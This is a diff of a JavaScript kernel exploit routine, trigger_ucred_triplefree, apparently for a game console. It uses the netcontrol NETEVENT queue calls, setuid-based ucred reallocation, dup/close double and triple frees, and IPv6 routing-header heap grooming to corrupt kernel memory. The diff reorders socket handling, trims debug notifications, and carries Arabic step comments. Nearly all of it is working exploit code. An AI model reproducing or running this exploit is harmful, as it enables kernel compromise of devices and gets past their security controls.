@@ -1453,11 +1453,11 @@ function nc_call(cmd, buf, len) {
       " ret=" + ret);
   return ret;
 }
+
 var TRIPLEFREE_REFCOUNT_FIX_LOOPS = 48;
 var TRIPLEFREE_REFCOUNT_MAX_WAIT = 6000;
-
 function trigger_ucred_triplefree() {
-  send_notification("[T] entered trigger");
+  send_notification("[T] trigger start");
   var end = false;
 
   log("[TRIGGER] init msgIov");
@@ -1468,89 +1468,66 @@ function trigger_ucred_triplefree() {
   while (!end && main_count < TRIPLEFREE_ITERATIONS) {
     main_count++;
 
-    send_notification("[T] before dummy_socket");
-    // 1) dummy socket → register in netcontrol
-    var dummy_socket = socket(AF_UNIX, SOCK_STREAM, 0);
-    if (dummy_socket.eq(BigInt_Error)) {
-      log("[TRIGGER] dummy_socket error, retry");
+    // 1) فتح سوكت الإدارة وتسجيله في netcontrol
+    send_notification("[T] opening main_socket");
+    var main_socket = socket(AF_UNIX, SOCK_STREAM, 0);
+    if (main_socket.eq(BigInt_Error)) {
       continue;
     }
-    send_notification("[T] after dummy_socket");
+    send_notification("[T] main_socket ready");
 
-    write32(nc_set_buf, Number(dummy_socket.and(0xFFFFFFFF)));
+    // 2) تسجيل السوكت في netcontrol ثم تخصيص ucred جديد
+    send_notification("[T] registering main_socket");
+    write32(nc_set_buf, Number(main_socket.and(0xFFFFFFFF)));
     nc_call(NET_CONTROL_NETEVENT_SET_QUEUE, nc_set_buf, 8);
-    close(dummy_socket); // مفيش داعي new BigInt هنا
 
-    send_notification("[T] before setuid");
-    // 2) allocate new ucred
     setuid(1);
+    send_notification("[T] ucred allocated");
 
-    // 3) reclaim fd → uaf_socket
-    send_notification("[T] before_reclaim_uaf");
+    // 3) فتح سوكت جديد (uaf_socket)
+    send_notification("[T] opening uaf_socket");
     var tmp_sock = socket(AF_UNIX, SOCK_STREAM, 0);
-    send_notification("[T] after_reclaim_uaf_call");
-    send_notification("[T] tmp_sock_raw=" + tmp_sock.toString());
-    
     if (tmp_sock.eq(BigInt_Error)) {
       log("[TRIGGER] uaf_socket error, retry");
       continue;
     }
-    send_notification("[T] tmp_sock_type=" + typeof tmp_sock);
-    send_notification("[T] tmp_sock_value=" + tmp_sock.toString());
     uaf_socket = Number(tmp_sock.and(0xFFFFFFFF));
+    send_notification("[T] uaf_socket ready");
 
-    // 4) free previous ucred
-    send_notification("[T] before_free_prev_ucred");
+    // 4) تحرير ucred السابق
     setuid(1);
-    send_notification("[T] after_free_prev_ucred");
+    send_notification("[T] freeing previous ucred");
 
+    // 5) إلغاء التسجيل من netcontrol باستخدام نفس السوكت الأساسي
+    send_notification("[T] clearing queue");
 
-    // 5) unregister → free file + ucred
-    send_notification("[T] before_clear_queue");
+    write32(nc_clear_buf, Number(main_socket.and(0xFFFFFFFF)));
+    nc_call(NET_CONTROL_NETEVENT_CLEAR_QUEUE, nc_clear_buf, 8);
 
-    // قيمة fd اللي داخل
-    send_notification("[T] clear_queue_uaf_socket=" + uaf_socket);
+    send_notification("[T] queue cleared");
 
-    // قبل الكتابة
-    send_notification("[T] before_write32_clear");
-    write32(nc_clear_buf, uaf_socket);
-    send_notification("[T] after_write32_clear");
-
-    // قبل nc_call
-    send_notification("[T] before_nc_call_clear");
-    send_notification("[T] nc_clear_buf_ptr=" + nc_clear_buf);
-    send_notification("[T] nc_clear_buf_size=32");
-    send_notification("[T] clear_queue_value=" + uaf_socket);
-
-    nc_call(NET_CONTROL_NETEVENT_CLEAR_QUEUE, nc_clear_buf, 4);
-    send_notification("[T] after_nc_call_clear");
-
-    // بعد العملية كلها
-    send_notification("[T] after_clear_queue");
+    // إغلاق السوكت الأساسي بعد الانتهاء
+    close(main_socket);
+    send_notification("[T] main_socket closed");
 
     // 6) refcount fix loop
-    send_notification("[T] before_refcount_fix");
+    send_notification("[T] refcount fix loop");
     for (var i = 0; i < TRIPLEFREE_REFCOUNT_FIX_LOOPS; i++) {
-        trigger_iov_recvmsg();
-        write(new BigInt(iov_sock_1), tmp, 1);
-        wait_iov_recvmsg();
-        read(new BigInt(iov_sock_0), tmp, 1);
+      trigger_iov_recvmsg();
+      write(new BigInt(iov_sock_1), tmp, 1);
+      wait_iov_recvmsg();
+      read(new BigInt(iov_sock_0), tmp, 1);
     }
-    send_notification("[T] after_refcount_fix");
-
     log("[TRIGGER] step 6 done");
 
     // 7) first double-free
-    send_notification("[T] before_double_free");
     close(dup(new BigInt(uaf_socket)));
-    send_notification("[T] after_double_free");
-
+    send_notification("[T] first free done");
 
     // 8) find twins
-    send_notification("[T] before_find_twins");
+    send_notification("[T] searching twins");
     end = find_twins();
-    send_notification("[T] after_find_twins");
-
+    send_notification("[T] twins found");
 
     if (!end) {
       log("[TRIGGER] step 8: no twins, cleanup & retry");
@@ -1564,7 +1541,7 @@ function trigger_ucred_triplefree() {
     
     
     // 9) free one twin
-    send_notification("[T] before _free_rthdr");
+    send_notification("[T] freeing twin header");
     free_rthdr(ipv6_socks[twins[1]]);
     
     // 🔍 refcount بعد free التوأم (ده المكان الصح)
@@ -1572,9 +1549,10 @@ function trigger_ucred_triplefree() {
     get_rthdr(ipv6_socks[twins[0]], leak_rthdr, 0x20);
     var mid_ref = read32(leak_rthdr);
     log("[TRIGGER] mid-refcount (after free twin[1])=" + mid_ref);
-    send_notification("[T] after_free_rthdr");
+    send_notification("[T] refcount updated");
 
     // 10) wait refcount == 1
+    send_notification("[T] waiting for refcount == 1");
     var count = 0;
     while (count < TRIPLEFREE_REFCOUNT_MAX_WAIT) {
       trigger_iov_recvmsg();
@@ -1599,9 +1577,9 @@ function trigger_ucred_triplefree() {
       end = false;
       continue;
     }
-
     triplets[0] = twins[0];
     log("[TRIGGER] step 10: refcount==1, triplets[0]=" + triplets[0]);
+    send_notification("[T] refcount stable");
 
     // 11) triple-free
     log("[TRIGGER] step 11: triple-free via dup(uaf_socket)");
@@ -1635,7 +1613,7 @@ function trigger_ucred_triplefree() {
     wait_iov_recvmsg();
     read(new BigInt(iov_sock_0), tmp, 1);
     log("[TRIGGER] step 13 done, triple found: [" +
-        triplets[0] + "," + triplets[1] + "," + triplets[2] + "]");
+    triplets[0] + "," + triplets[1] + "," + triplets[2] + "]");
   }
 
   if (main_count === TRIPLEFREE_ITERATIONS) {
